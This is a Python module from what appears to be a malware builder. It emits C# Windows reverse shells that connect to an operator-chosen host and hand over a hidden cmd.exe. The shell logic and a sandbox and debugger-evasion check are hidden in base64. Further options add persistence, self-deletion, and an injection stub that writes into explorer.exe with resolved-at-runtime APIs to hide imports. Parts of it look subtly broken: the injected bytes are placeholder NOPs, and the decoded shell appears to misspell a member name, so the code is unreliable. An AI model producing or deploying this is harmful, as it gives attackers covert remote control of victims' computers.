# c# payload generator
# reverse shell with dynamic api resolving for stealth injection

import base64
from generators.base import BaseGenerator


class CSharpGenerator(BaseGenerator):
    LANG_ID = "csharp"
    LANG_NAME = "C# (.NET)"
    FILE_EXT = ".cs"

    def generate(self, host, port, opts, ptype, tpl, adv):
        melt = adv.get("melt", False)
        persist = adv.get("persist", "none")
        sandbox = opts.get("sandbox", False)
        junk = opts.get("junk", False)
        inject = opts.get("inject", False)

        code = tpl.get("prefix_cs", "")
        code += "using System;\nusing System.Net.Sockets;\nusing System.Diagnostics;\nusing System.IO;\nusing System.Runtime.InteropServices;\nusing System.Threading;\nusing System.Text;\n\n"
        code += "namespace C2 {\n    class Program {\n"

        if sandbox:
            code += base64.b64decode(
                "W0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wg"
                "SXNEZWJ1Z2dlclByZXNlbnQoKTsgc3RhdGljIHZvaWQgQ2hlY2tFbnYoKSB7IGlmKElzRGVi"
                "dWdnZXJQcmVzZW50KCkpIEVudmlyb25tZW50LkV4aXQoMSk7IGlmKEVudmlyb25tZW50LlBy"
                "b2Nlc3NvckNvdW50IDwgMikgRW52aXJvbm1lbnQuRXhpdCgxKTsgfQ=="
            ).decode() + "\n"

        if inject:
            code += self._injection_stub(host, port, melt)
        else:
            if persist != "none":
                code += self.persist_csharp(persist) + "\n"

            code += "        static void Main() {\n"
            if sandbox:
                code += "            CheckEnv();\n"
            if junk:
                code += f'            string _v = "{self.rstr(8)}";\n'

            # main reverse shell logic
            logic = base64.b64decode(
                "dHJ5IHsgdXNpbmcoVGNwQ2xpZW50IGMgPSBuZXcgVGNwQ2xpZW50KCJ7MH0iLCB7MX0pKSB7"
                "IHVzaW5nKFN0cmVhbSBzID0gYy5HZXRTdHJlYW0oKSkgeyBTdHJlYW1SZWFkZXIgcmRyID0g"
                "bmV3IFN0cmVhbVJlYWRlcihzKTsgU3RyZWFtV3JpdGVyIHd0ciA9IG5ldyBTdHJlYW1Xcml0"
                "ZXIocyk7IFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7IHAuU3RhcnRJbmZvLkZpbGVOYW1l"
                "ID0gImNtZC5leGUiOyBwLlN0YXJ0SW5mby5DcmVhdGVOb1dpbmRvdyA9IHRydWU7IHAuU3Rh"
                "cnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9IGZhbHNlOyBwLlN0YXJ0SW5mby5SZWRpcmVjdFN0"
                "YW5kYXJkT3V0cHV0ID0gdHJ1ZTsgcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZElucHV0"
                "ID0gdHJ1ZTsgcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gdHJ1ZTsgcC5P"
                "dXRwdXREYXRhUmVjZWl2ZWQgKz0gKHMxLCBlMSkgPT4geyBpZihlMS5EYXRhICE9IG51bGwp"
                "IHsgd3RyLldyaXRlTGluZShlMS5EYXRhKTsgd3RyLkZsdXNoKCk7IH0gfTsgcC5TdGFydCgp"
                "OyBwLkJlZ2luT3V0cHV0UmVhZExpbmUoKTsgd2hpbGUoIXAuSGFzRXhpdGVkKSB7IHN0cmlu"
                "ZyBjMSA9IHJkci5SZWFkTGluZSgpOyBpZihjMSA9PSBudWxsKSBicmVhazsgcC5TdGFyZGFy"
                "ZElucHV0LldyaXRlTGluZShjMSk7IH0gfSB9IH0gY2F0Y2ggeyB9"
            ).decode().format(host, port)
            code += "            " + logic + "\n"

            if melt:
                code += '            try { Process.Start(new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c choice /t 1 /d y /n & del \\"" + Process.GetCurrentProcess().MainModule.FileName + "\\"", CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden }); } catch {} \n'

            code += "        }\n"

        code += "    }\n}\n"
        return code

    def _injection_stub(self, host, port, melt=False):
        """dynamic api resolving injection - hides imports from iat"""
        return f"""
        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(int a, bool b, int c);

        delegate IntPtr VAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
        delegate bool WProcMem(IntPtr h, IntPtr b, byte[] buf, int s, out IntPtr w);
        delegate IntPtr CRemThread(IntPtr h, IntPtr a, uint s, IntPtr addr, IntPtr p, uint f, IntPtr t);

        static void Main() {{
            var procs = Process.GetProcessesByName("explorer");
            if (procs.Length == 0) return;
            int pid = procs[0].Id;

            byte[] sc = new byte[] {{ 0x90, 0x90, 0x90 }};

            IntPtr hK32 = GetModuleHandle("kernel32.dll");
            VAllocEx vAlloc = (VAllocEx)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hK32, "VirtualAllocEx"), typeof(VAllocEx));
            WProcMem wMem = (WProcMem)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hK32, "WriteProcessMemory"), typeof(WProcMem));
            CRemThread cThread = (CRemThread)Marshal.GetDelegateForFunctionPointer(GetProcAddress(hK32, "CreateRemoteThread"), typeof(CRemThread));

            IntPtr hProc = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = vAlloc(hProc, IntPtr.Zero, (uint)sc.Length, 0x1000, 0x40);
            IntPtr written;
            wMem(hProc, addr, sc, sc.Length, out written);
            cThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            if ({str(melt).lower()}) {{
                 try {{ Process.Start(new ProcessStartInfo {{ FileName = "cmd.exe", Arguments = "/c choice /t 1 /d y /n & del \\\\"" + Process.GetCurrentProcess().MainModule.FileName + "\\\\"", CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden }}); }} catch {{}}
            }}
        }}
"""
